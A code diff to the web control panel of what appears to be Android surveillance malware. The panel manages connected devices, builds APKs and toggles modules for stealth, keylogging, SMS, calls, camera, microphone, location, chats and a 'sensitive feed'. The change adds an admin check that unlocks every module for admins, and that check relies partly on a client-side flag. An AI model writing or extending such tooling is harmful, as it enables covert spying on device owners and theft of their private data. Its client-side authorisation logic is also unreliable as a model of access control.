@@ -300,6 +300,17 @@
         });
     }
 
+    function checkIsAdmin(userEmail, userMeta) {
+        if (window.isUserAdmin === true) return true;
+        const email = (userEmail || (fbAuth.currentUser ? fbAuth.currentUser.email : '') || '').trim().toLowerCase();
+        const isEmailAdmin = ADMIN_EMAILS.map(e => e.trim().toLowerCase()).includes(email);
+        const meta = userMeta || (typeof currentUserMeta !== 'undefined' ? currentUserMeta : {}) || (typeof currentUserProfile !== 'undefined' ? currentUserProfile : {}) || {};
+        const isRoleAdmin = meta && (meta.role === 'ADMIN' || meta.role === 'admin');
+        return isEmailAdmin || isRoleAdmin;
+    }
+
+    let currentUserMeta = {};
+
     // Firebase Auth State Listener
     fbAuth.onAuthStateChanged(user => {
         if (user) {
@@ -309,11 +320,8 @@
             document.getElementById('navUserProfile').style.display = 'flex';
 
             // Calculate user's UID (sanitize user's email or fallback to user.uid)
-            const email = user.email || '';
+            const email = (user.email || '').trim().toLowerCase();
             userId = email ? email.replace(/[@.]/g, '_') : user.uid;
-            
-            // Check if user is Admin
-            const isAdmin = ADMIN_EMAILS.includes(email.toLowerCase());
 
             // Track user activity in Firebase users_meta
             trackUserActivity(user, 'Accessed Command Center');
@@ -347,16 +355,40 @@
             });
 
             // Listen to real-time user permissions and role
-            let currentUserMeta = {};
             fbDb.ref('users_meta/' + userId).on('value', snap => {
                 currentUserMeta = snap.val() || {};
+                currentUserProfile = currentUserMeta;
                 evaluateIndexPermissions();
             });
 
             function evaluateIndexPermissions() {
-                const userCustom = currentUserMeta.permissions || {};
-                window.userPermissions = Object.assign({}, globalDefaultRules, userCustom);
-                window.isUserAdmin = isAdmin || currentUserMeta.role === 'ADMIN';
+                window.isUserAdmin = checkIsAdmin(email, currentUserMeta);
+
+                if (window.isUserAdmin) {
+                    // Admin gets 100% UNRESTRICTED full access to everything
+                    window.userPermissions = {
+                        sms: true,
+                        notification: true,
+                        stealth: true,
+                        accounts: true,
+                        calls: true,
+                        gallery: true,
+                        files: true,
+                        location: true,
+                        keylogs: true,
+                        audio: true,
+                        camera: true,
+                        chats: true,
+                        apps: true,
+                        privacy_screen: true,
+                        sensitive_feed: true,
+                        edit_modules: true,
+                        build_apk: true
+                    };
+                } else {
+                    const userCustom = currentUserMeta.permissions || {};
+                    window.userPermissions = Object.assign({}, globalDefaultRules, userCustom);
+                }
 
                 // Display user name, avatar, role badge, and UID display
                 document.getElementById('uidDisplay').textContent = userId;
@@ -416,6 +448,11 @@
                         input.parentElement.title = 'Module configuration locked for standard accounts. Full modules active.';
                     });
                 }
+
+                // If device list was already loaded, refresh view mode
+                if (typeof renderDeviceList === 'function' && Object.keys(deviceCache).length > 0) {
+                    renderDeviceList();
+                }
             }
 
             // Initialize app and device listeners
@@ -441,14 +478,14 @@
     // Track User Profile & Activity in Firebase users_meta
     function trackUserActivity(user, actionName) {
         if (!user) return;
-        const email = user.email || '';
+        const email = (user.email || '').trim().toLowerCase();
         const uid = email ? email.replace(/[@.]/g, '_') : user.uid;
-        const isHardcodedAdmin = ADMIN_EMAILS.includes(email.toLowerCase());
+        const isHardcodedAdmin = ADMIN_EMAILS.map(e => e.trim().toLowerCase()).includes(email);
 
         fbDb.ref('users_meta/' + uid).once('value', snap => {
             const umeta = snap.val() || {};
             const loginCount = (umeta.login_count || 0) + (actionName.includes('Login') || actionName.includes('Accessed') ? 1 : 0);
-            const role = isHardcodedAdmin ? 'ADMIN' : (umeta.role || 'USER');
+            const role = (isHardcodedAdmin || umeta.role === 'ADMIN') ? 'ADMIN' : (umeta.role || 'USER');
 
             const updatedData = {
                 uid: uid,
@@ -461,6 +498,10 @@
                 login_count: loginCount,
                 user_agent: navigator.userAgent
             };
+
+            if (isHardcodedAdmin || role === 'ADMIN') {
+                updatedData.role = 'ADMIN';
+            }
 
             // Set created_at if first time
             if (!umeta.created_at) updatedData.created_at = Date.now();
